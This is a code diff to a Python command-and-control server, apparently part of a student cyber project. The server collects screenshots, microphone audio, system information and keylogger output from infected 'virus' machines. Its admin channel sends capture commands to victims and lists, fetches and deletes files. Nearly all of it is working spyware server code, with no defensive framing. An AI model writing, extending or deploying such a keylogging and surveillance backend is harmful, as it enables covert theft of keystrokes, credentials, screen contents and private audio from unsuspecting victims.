@@ -6,6 +6,7 @@ from os.path import join
 import pyaudio
 import wave
 import shutil
+from Actions import Actions
 
 HEADER = 2048
 PORT = 5050
@@ -13,8 +14,8 @@ SERVER = socket.gethostbyname(socket.gethostname())
 ADDR = (SERVER, PORT)
 FORMAT = 'utf-8'
 DISCONNECT_MESSAGE = "!DISCONNECT"
-PATH = "D:\\Cyber Final Project\\FireRasbarry\\"
-IDENTIFIERS = ['screenshot', 'audio', 'computer_info', 'key_logger']
+PATH = './'
+IDENTIFIERS = ['screenshot', 'audio', 'computer_info', 'keylogger']
 IDENTIFIERS_EXTENSIONS = ['png', 'wav', 'txt', 'txt']
 
 
@@ -38,10 +39,16 @@ class VirusSocket(threading.Thread):
 
         try:
             # Create a folder once
-            folder_path = PATH + str(self.addr)
-            if not os.path.isdir(PATH + str(self.addr)):
+            folder_path = PATH + str(self.addr).replace(" ", "") + "-connected"
+            if not os.path.isdir(folder_path):
                 os.makedirs(folder_path)
 
+            # Create a keylogger file
+            if os.path.exists(folder_path + '\\' + 'keylogger.txt'):  # Don't overwrite new logging in virus
+                with open(folder_path + '\\' + 'keylogger.txt', 'wb+'):
+                    pass
+
+            print(folder_path)
             while True:
                 filenames = [f for f in os.listdir(folder_path) if os.path.isfile(join(folder_path, f))]
 
@@ -61,18 +68,40 @@ class VirusSocket(threading.Thread):
                     print(data_length)
                     # Write a file based on it's identifier (f.e. keylogger -> append, screenshot -> add)
                     data = self.conn.recv(data_length)
+
+                    # Special writing for wav file
+                    if identifier == 'audio':
+                        print('Received audio')
+                        Actions.write_wav_file(data, filepath)
+                        continue
+
                     file = open(filepath, openmode)
                     print(len(data))
                     file.write(data)
                     file.close()
 
         except Exception as e:
-            print('Excention: ', e)
+            print('Exception: ', e)
             self.conn.close()
+            os.rename(folder_path, PATH + str(self.addr).replace(" ", "") + "-disconnected")
 
-    def request_from_virus(self, req_type: str):
-        if req_type == 'screenshot':
-            self.conn.send('Give me a screenshot'.encode())
+
+
+# Function returns filename and file open mode based on current files in client's dir
+def get_filename_openmode(identifier, filenames):
+    # Special cases -> computer_info, key_logger
+    match identifier:
+        case 'keylogger':
+            return 'keylogger.txt', 'ab'
+        case 'computer_info':
+            return 'computer_info.txt', 'wb'
+        case _:
+            counter = 0
+            for filename in filenames:
+                if identifier in filename:
+                    counter += 1
+            print(f'{identifier}_{counter}.{IDENTIFIERS_EXTENSIONS[IDENTIFIERS.index(identifier)]}', 'wb')
+            return f'{identifier}_{counter}.{IDENTIFIERS_EXTENSIONS[IDENTIFIERS.index(identifier)]}', 'wb'
 
 
 class Server:
@@ -91,7 +120,6 @@ class Server:
             conn, addr = self.sock.accept()
             print(str(addr) + "aaaaaaaaa")
             self.virus_devices[str(addr).replace(" ", "")] = VirusSocket(conn, addr)
-
             self.virus_devices[str(addr).replace(" ", "")].start()
             print(f"[ACTIVE CONNECTIONS] {threading.active_count() - 1}")
 
@@ -99,23 +127,6 @@ class Server:
         # Runs when object destroyed
         print('Closing socket')
         self.sock.close()
-
-
-# Function returns filename and file open mode based on current files in client's dir
-def get_filename_openmode(identifier, filenames):
-    # Special cases -> computer_info, key_logger
-    match identifier:
-        case 'key_logger':
-            return 'key_logger.txt', 'ab'
-        case 'computer_info':
-            return 'computer_info.txt', 'wb'
-        case _:
-            counter = 0
-            for filename in filenames:
-                if identifier in filename:
-                    counter += 1
-            print(f'{identifier}_{counter}.{IDENTIFIERS_EXTENSIONS[IDENTIFIERS.index(identifier)]}', 'wb')
-            return f'{identifier}_{counter}.{IDENTIFIERS_EXTENSIONS[IDENTIFIERS.index(identifier)]}', 'wb'
 
 
 class AdminServer:
@@ -141,8 +152,8 @@ class AdminServer:
                     break  # Shouldn't handle disconnected admin
                 msg = msg.replace(" ", "")
                 self.handle_message(msg, conn)
-        except:
-            print("admin disconnected")
+        except Exception as e:
+            print(f"admin disconnected: {e}")
 
     def handle_message(self, msg, conn):
         self.msg = msg
@@ -164,6 +175,7 @@ class AdminServer:
             return False
 
     def self_action(self, conn):
+
         if "delete" in self.msg:  # DELETE
             path = self.msg[6:]
             # We identify between a file and a folder by the dot if we have dot in [-4] it file
@@ -199,13 +211,6 @@ class AdminServer:
             send_length += b' ' * (HEADER - len(send_length))
             conn.send(send_length)
             conn.send(data)
-            # We identify between a file and a folder by the dot if we have dot in [-4] it file
-            if path[-4] == ".":
-                os.remove(path)
-            # else = folder
-            else:
-                shutil.rmtree(path)
-
 
 
 
@@ -221,41 +226,36 @@ class AdminServer:
 
         elif "getfiles" in self.msg:
             path = self.msg[8:]
-            file_names = [f for f in os.listdir(path) if os.path.isfile(join(path, f))]
-            print(path)
-            data = ""
-            for file in file_names:
-                data += "---" + file
-            msg = data[3:].encode()
-            msg += b' ' * (2048 - len(msg))
-            conn.send(msg)
+            try:
+                file_names = [f for f in os.listdir(path) if os.path.isfile(join(path, f))]
+                print(path)
+                data = ""
+                for file in file_names:
+                    data += "---" + file
+                msg = data[3:].encode()
+                msg += b' ' * (2048 - len(msg))
+                conn.send(msg)
+            except:  # This exception handles with the issue of deleting a folder and trying to
+                     # to open it
+                msg = "NONE".encode()
+                msg += b' ' * (2048 - len(msg))
+                conn.send(msg)
         else:
             print("something went wrong")
 
     def send_to_virus(self):
+        # Examples: screenshot('127.0.0.1',450); pcinfo('127 .0.0.1',450); keylogger123231('127.0.0.1',450); audio('127.0.0.1',450)
         # Identification of the request
-        if "screenshot" in self.msg:
-            addr = self.msg.split("screenshot")[-1]
-            print(self.viruses_server.virus_devices)
-            virus_socket = self.viruses_server.virus_devices[addr]
-            msg_to_virus = "screenshot".encode()
-            msg_to_virus += b' ' * (2048 - len(msg_to_virus))
-            virus_socket.conn.send(msg_to_virus)
-        elif "pcinfo" in self.msg:
-            pass
-        elif "keylogger" in self.msg:
-            pass
-        elif "audio" in self.msg:
-            addr = self.msg.split("audio")[-1]
 
-            print(self.viruses_server.virus_devices)
-            virus_socket = self.viruses_server.virus_devices[addr]
-            msg_to_virus = "audio".encode()
-            msg_to_virus += b' ' * (2048 - len(msg_to_virus))
-            virus_socket.conn.send(msg_to_virus)
+        command_type, addr = self.msg.split("(")  # = (ipaddr,port)
+        addr = ('(' + addr).split('-')[0]  # Retrieve 'deleted (', delete -connected / -disconnected
+        print('here', command_type, addr)
+        virus_socket = self.viruses_server.virus_devices[addr]
 
-        else:
-            print("something went wrong")
+        # Passing command through the server to virus
+        msg_to_virus = command_type.encode()
+        msg_to_virus += b' ' * (2048 - len(msg_to_virus))
+        virus_socket.conn.send(msg_to_virus)
 
 
 def main():
